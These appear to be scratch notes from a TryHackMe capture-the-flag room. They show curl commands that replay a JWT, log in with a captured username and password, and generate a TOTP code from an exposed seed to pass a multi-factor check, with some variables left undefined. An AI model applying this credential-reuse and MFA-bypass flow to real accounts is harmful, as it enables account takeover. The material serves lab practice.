# ctf

export TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxOCwiZXhwIjoxNzExNTk3MZU2fQ.o2unppmMOWXRMZUtLDcLCLWR760hucRVBNSMm5jxsxVY"


curl -s -H "Authorization: Bearer $TOKEN2" "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/quotes"


login_shadow.json

{
  "username": "diana.flores721",
  "password": "loveangel"
}

curl -i -X POST -H "Content-Type: application/json" -H "Accept: application/json" --data-binary @login_shadow.json "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/login"


OTP=$(python3 - <<'PY'
import pyotp
seed="IIYHLF76AK4UM63STUSWZ6SCVT2HXGZTOKS3EMFVEBGX4V2ZVO3Q===="
print(pyotp.TOTP(seed).now())
PY
)

curl -s -X POST -H "Content-Type: application/json" \
--data-binary "{\"temp_token\":\"$TEMP\",\"otp_code\":\"$OTP\",\"device_fingerprint\":null}" \
"$BASE/verify-otp"
echo


python3 -m venv venv
source venv/bin/activate
pip install pyotp
